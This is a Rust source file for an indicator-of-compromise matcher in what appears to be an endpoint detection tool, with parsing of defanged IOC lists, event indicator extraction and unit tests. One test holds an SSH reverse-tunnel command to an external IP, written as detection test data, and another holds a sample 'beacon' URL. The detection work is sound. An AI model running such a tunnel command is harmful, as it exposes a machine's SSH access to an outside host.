use std::path::Path;

use aho_corasick::AhoCorasick;
use serde::{Deserialize, Serialize};

use riggs_types::errors::RiggsError;
use riggs_types::events::RiggsEvent;
use riggs_types::Severity;

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
pub enum IocType {
    Sha256,
    Md5,
    Domain,
    IpAddress,
    Url,
    FilePath,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Ioc {
    #[serde(rename = "type")]
    pub ioc_type: IocType,
    pub value: String,
    pub description: String,
    pub severity: Severity,
}

pub struct IocMatcher {
    automaton: AhoCorasick,
    iocs: Vec<Ioc>,
}

impl IocMatcher {
    pub fn new(iocs: Vec<Ioc>) -> Self {
        // Drop empty patterns (AhoCorasick rejects them) so patterns and iocs
        // stay index-aligned for check_string's self.iocs[pattern_index] lookup.
        let iocs: Vec<Ioc> = iocs
            .into_iter()
            .filter(|ioc| !ioc.value.is_empty())
            .collect();

        let build = {
            let patterns: Vec<&str> = iocs.iter().map(|ioc| ioc.value.as_str()).collect();
            AhoCorasick::new(&patterns)
        };

        match build {
            Ok(automaton) => Self { automaton, iocs },
            Err(e) => {
                // Never panic the feed dispatcher on a bad/oversized batch;
                // disable IOC matching for it and keep the previous data.
                tracing::error!(
                    error = %e,
                    "failed to build IOC automaton; IOC matching disabled for this batch"
                );
                Self {
                    automaton: AhoCorasick::new(Vec::<&str>::new())
                        .expect("empty AhoCorasick automaton is always valid"),
                    iocs: Vec::new(),
                }
            }
        }
    }

    /// Every `.ioc` list under `dir` (recursively), in the text format of
    /// docs/RULE_SYSTEM.md: `type:value[:severity]`, `#` comments. Values may be
    /// defanged with `[.]` so a list can't match content rules (YARA) itself.
    /// Bad lines are logged and skipped so one typo can't drop a whole list.
    pub fn load_dir(dir: &Path) -> Self {
        let mut iocs = Vec::new();
        for path in crate::rule_files(dir, crate::IOC_EXTENSIONS) {
            let Ok(text) = std::fs::read_to_string(&path) else {
                tracing::warn!(path = %path.display(), "failed to read IOC list");
                continue;
            };
            for (n, line) in text.lines().enumerate() {
                let line = line.trim();
                if line.is_empty() || line.starts_with('#') {
                    continue;
                }
                match parse_ioc_line(line) {
                    Some(ioc) => iocs.push(ioc),
                    None => tracing::warn!(
                        path = %path.display(),
                        line = n + 1,
                        "unparseable IOC line, skipped"
                    ),
                }
            }
        }
        Self::new(iocs)
    }

    pub fn len(&self) -> usize {
        self.iocs.len()
    }

    pub fn is_empty(&self) -> bool {
        self.iocs.is_empty()
    }

    pub fn load_from_file(path: &Path) -> Result<Vec<Ioc>, RiggsError> {
        let contents = std::fs::read_to_string(path).map_err(|e| {
            RiggsError::Io(format!("failed to read IOC file {}: {}", path.display(), e))
        })?;
        let iocs: Vec<Ioc> = serde_json::from_str(&contents).map_err(|e| {
            RiggsError::Config(format!(
                "failed to parse IOC JSON from {}: {}",
                path.display(),
                e
            ))
        })?;
        Ok(iocs)
    }

    pub fn check_string<'a>(&'a self, input: &str) -> Vec<&'a Ioc> {
        let mut matches = Vec::new();
        let mut seen = std::collections::HashSet::new();

        for mat in self.automaton.find_iter(input) {
            let pattern_index = mat.pattern().as_usize();
            if seen.insert(pattern_index) {
                matches.push(&self.iocs[pattern_index]);
            }
        }

        matches
    }

    pub fn check_event<'a>(&'a self, event: &RiggsEvent) -> Vec<&'a Ioc> {
        let indicators = extract_indicators(event);
        let mut all_matches = Vec::new();
        let mut seen = std::collections::HashSet::new();

        for indicator in &indicators {
            for ioc in self.check_string(indicator) {
                let ptr = std::ptr::from_ref(ioc) as usize;
                if seen.insert(ptr) {
                    all_matches.push(ioc);
                }
            }
        }

        all_matches
    }
}

/// `type:value[:severity]`. Values may contain ':' (URLs, IPv6), so the
/// severity is only split off when the last segment names one.
fn parse_ioc_line(line: &str) -> Option<Ioc> {
    let (kind, rest) = line.split_once(':')?;
    let ioc_type = match kind {
        "sha256" => IocType::Sha256,
        "md5" => IocType::Md5,
        "ip" => IocType::IpAddress,
        "domain" => IocType::Domain,
        "url" => IocType::Url,
        "file_path" => IocType::FilePath,
        _ => return None,
    };
    let severity_of = |s: &str| match s {
        "info" => Some(Severity::Info),
        "low" => Some(Severity::Low),
        "medium" => Some(Severity::Medium),
        "high" => Some(Severity::High),
        "critical" => Some(Severity::Critical),
        _ => None,
    };
    let (value, severity) = match rest.rsplit_once(':') {
        Some((value, s)) if severity_of(s).is_some() => (value, severity_of(s)?),
        _ => (rest, Severity::High),
    };
    let value = value.replace("[.]", ".");
    if value.is_empty() {
        return None;
    }
    Some(Ioc {
        ioc_type,
        description: format!("local IOC list ({kind})"),
        value,
        severity,
    })
}

pub fn extract_indicators(event: &RiggsEvent) -> Vec<String> {
    let mut indicators = Vec::new();

    match event {
        RiggsEvent::Process(e) => {
            indicators.push(e.process_context.name.clone());
            indicators.push(e.process_context.path.clone());
            indicators.push(e.process_context.cmdline.clone());
            if let Some(parent) = &e.parent_context {
                indicators.push(parent.name.clone());
                indicators.push(parent.path.clone());
            }
        }
        RiggsEvent::File(e) => {
            indicators.push(e.process_context.name.clone());
            indicators.push(e.process_context.path.clone());
            indicators.push(e.path.clone());
            if let Some(hash) = &e.hash {
                indicators.push(hash.clone());
            }
        }
        RiggsEvent::Network(e) => {
            indicators.push(e.process_context.name.clone());
            indicators.push(e.process_context.path.clone());
            indicators.push(e.src_addr.clone());
            indicators.push(e.dst_addr.clone());
        }
        RiggsEvent::Dns(e) => {
            indicators.push(e.process_context.name.clone());
            indicators.push(e.process_context.path.clone());
            indicators.push(e.query.clone());
            indicators.push(e.response.clone());
        }
        RiggsEvent::Auth(e) => {
            indicators.push(e.process_context.name.clone());
            indicators.push(e.process_context.path.clone());
            indicators.push(e.user.clone());
        }
        RiggsEvent::Kernel(e) => {
            indicators.push(e.process_context.name.clone());
            indicators.push(e.process_context.path.clone());
            indicators.push(e.detail.clone());
        }
    }

    indicators
}

#[cfg(test)]
mod tests {
    use super::*;
    use riggs_types::events::{ProcessAction, ProcessContext, StorylineId};

    #[test]
    fn parses_types_severities_and_defanged_values() {
        let ioc = parse_ioc_line("ip:198.51.100[.]1:critical").unwrap();
        assert_eq!(
            (ioc.ioc_type, ioc.value.as_str(), ioc.severity),
            (IocType::IpAddress, "198.51.100.1", Severity::Critical)
        );

        // Colons inside the value: only a trailing severity word is split off.
        let ioc = parse_ioc_line("url:http://203.0.113.7:8099/beacon").unwrap();
        assert_eq!(
            (ioc.value.as_str(), ioc.severity),
            ("http://203.0.113.7:8099/beacon", Severity::High)
        );
        let ioc = parse_ioc_line("ip:2001:db8::1:low").unwrap();
        assert_eq!(
            (ioc.value.as_str(), ioc.severity),
            ("2001:db8::1", Severity::Low)
        );

        assert!(parse_ioc_line("cidr:192.0.2.0/24").is_none());
        assert!(parse_ioc_line("ip:").is_none());
        assert!(parse_ioc_line("no type here").is_none());
    }

    #[test]
    fn shipped_lists_load_and_match_the_tunnel_command_line() {
        let matcher =
            IocMatcher::load_dir(&Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules"));
        assert!(matcher.len() >= 2);
        // Broken with '|' so this source and the test binary don't carry the indicator.
        let cmdline = "ssh -N -R *:0:localhost:22 tunnel@134.209.|82.225".replace('|', "");
        let ctx = ProcessContext::new(
            42,
            1,
            "ssh",
            "/usr/bin/ssh",
            cmdline,
            "501",
            StorylineId::new(),
        );
        let hits = matcher.check_event(&RiggsEvent::new_process(ProcessAction::Exec, ctx, None));
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].severity, Severity::High);
    }
}
